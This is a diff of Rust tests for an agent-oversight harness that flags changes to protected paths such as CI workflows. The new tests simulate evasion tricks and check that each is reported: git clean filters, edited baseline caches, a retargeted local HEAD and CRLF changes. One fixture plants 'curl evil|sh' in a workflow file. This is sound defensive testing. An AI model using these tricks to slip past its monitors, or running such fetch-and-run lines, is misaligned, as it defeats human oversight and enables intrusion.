@@ -955,12 +955,13 @@ fn a_finding_in_the_sessions_own_commit_merged_from_a_branch_is_reported_once() 
 }
 
 #[test]
-fn a_gated_move_the_agent_committed_itself_is_worded_as_its_own_change() {
+fn a_gated_move_the_agent_committed_itself_is_an_error_with_no_base_match() {
     let dir = launder_fixture("own-commit-wording");
     bash(&dir, &format!("{A} && git commit -qam b"));
     let v = post(&dir);
     let person = v["person"].as_str().unwrap();
-    assert!(person.contains("[acceptance]"), "{v}");
+    assert!(person.contains("[acceptance] error"), "{v}");
+    assert!(v["base_match"].is_null(), "{v}");
 }
 
 /// An upstream repository with the gates, and a clone of it whose
@@ -1235,5 +1236,130 @@ fn no_base_ref_is_stated() {
             .unwrap()
             .contains("no base ref to compare with: 'origin/HEAD' does not resolve"),
         "{v}"
+    );
+}
+
+#[test]
+fn a_clean_filter_cannot_make_a_change_match_the_base() {
+    let (_up, dir, _h) = cloned_fixture("clean-filter");
+    bash(
+        &dir,
+        "git config filter.ev.clean 'git show origin/HEAD:.github/workflows/ci.yml' && echo '.github/workflows/ci.yml filter=ev' >> .git/info/attributes && echo 'on: push; run: curl evil|sh' > .github/workflows/ci.yml",
+    );
+    let v = post(&dir);
+    assert!(v["base_match"].is_null(), "{v}");
+    assert!(
+        v["person"]
+            .as_str()
+            .unwrap()
+            .contains("[protected-paths] error"),
+        "{v}"
+    );
+}
+
+#[test]
+fn crlf_on_disk_under_autocrlf_does_not_match_the_base() {
+    let (up, dir, _h) = cloned_fixture("autocrlf");
+    upstream_change(&up);
+    bash(
+        &dir,
+        "git pull -q --ff-only && git config core.autocrlf true && sed -i 's/$/\\r/' .github/workflows/ci.yml",
+    );
+    let v = post(&dir);
+    assert!(
+        !base_paths(&v).contains(&".github/workflows/ci.yml".to_string()),
+        "{v}"
+    );
+}
+
+const SET_BASE_HEAD: &str = "sed -i 's/post-command: {enabled: true}/post-command: {enabled: true, base: HEAD}/' .urzua/config.yaml";
+
+#[test]
+fn a_rule_change_in_one_command_is_reported_and_the_next_command_keeps_full_weight() {
+    let (_up, dir, _h) = cloned_fixture("two-cmd");
+    bash(&dir, &format!("{SET_BASE_HEAD} && git commit -qam cfg"));
+    let v = post(&dir);
+    let person = v["person"].as_str().unwrap();
+    assert!(
+        person.contains("[post-command] error")
+            && person.contains("changed the post-command comparison rule from base 'origin/HEAD', base_match 'info' to base 'HEAD', base_match 'info'"),
+        "{v}"
+    );
+    bash(&dir, &format!("{W} && git commit -qam x"));
+    let v = post(&dir);
+    let person = v["person"].as_str().unwrap();
+    assert!(!person.contains(" info: "), "{v}");
+    assert!(
+        person.contains(" error: ")
+            && person.contains(
+                "the local ref HEAD, which the agent can move, so the match proves nothing"
+            ),
+        "{v}"
+    );
+}
+
+#[test]
+fn an_edited_baseline_rule_is_reported_and_lowers_nothing() {
+    let (_up, dir, _h) = cloned_fixture("forged-cache");
+    bash(
+        &dir,
+        "sed -i 's/\"post_base\":\"origin\\/HEAD\"/\"post_base\":\"HEAD\"/' .urzua/cache/protected-hashes.json && grep -q '\"post_base\":\"HEAD\"' .urzua/cache/protected-hashes.json",
+    );
+    bash(&dir, &format!("{W} && git commit -qam x"));
+    let v = post(&dir);
+    let person = v["person"].as_str().unwrap();
+    assert!(person.contains("so the baseline was edited"), "{v}");
+    assert!(person.contains("[protected-paths] error"), "{v}");
+    assert!(v["base_match"].is_null(), "{v}");
+}
+
+#[test]
+fn a_local_base_never_lowers_the_report() {
+    let (_up, dir, _h) = cloned_fixture_with(
+        "local-base",
+        Some("post-command: {enabled: true, base: HEAD}"),
+    );
+    bash(&dir, &format!("{W} && git commit -qam x"));
+    let v = post(&dir);
+    let person = v["person"].as_str().unwrap();
+    assert!(
+        person.starts_with("urzua harness (post-command) error: the command changed 1 gated path(s) (.github/workflows/ci.yml), and each now holds exactly the content on the local ref HEAD, which the agent can move, so the match proves nothing."),
+        "{v}"
+    );
+    assert_eq!(v["base_match"]["level"], "error", "{v}");
+}
+
+#[test]
+fn a_pull_that_changes_the_rule_reports_the_change_once() {
+    let (up, dir, _h) = cloned_fixture("rule-pull");
+    bash(&up, "sed -i 's/post-command: {enabled: true}/post-command: {enabled: true, base_match: warning}/' .urzua/config.yaml && git commit -qam rule");
+    bash(&dir, "git pull -q --ff-only");
+    let v = post(&dir);
+    let person = v["person"].as_str().unwrap();
+    assert_eq!(
+        person
+            .matches("changed the post-command comparison rule")
+            .count(),
+        1,
+        "{v}"
+    );
+    bash(&dir, "ls >/dev/null");
+    assert_eq!(post(&dir)["verdict"], "allow");
+}
+
+#[test]
+fn at_base_match_error_the_sentence_does_not_say_nothing_needs_doing() {
+    let (up, dir, _h) = cloned_fixture_with(
+        "level-error",
+        Some("post-command: {enabled: true, base_match: error}"),
+    );
+    upstream_change(&up);
+    bash(&dir, "git pull -q --ff-only");
+    let person = post(&dir)["person"].as_str().unwrap().to_string();
+    assert!(
+        person.ends_with("now holds exactly the content on origin/HEAD (origin/main).")
+            && person.contains(" error: ")
+            && !person.contains("nothing needs doing"),
+        "{person}"
     );
 }
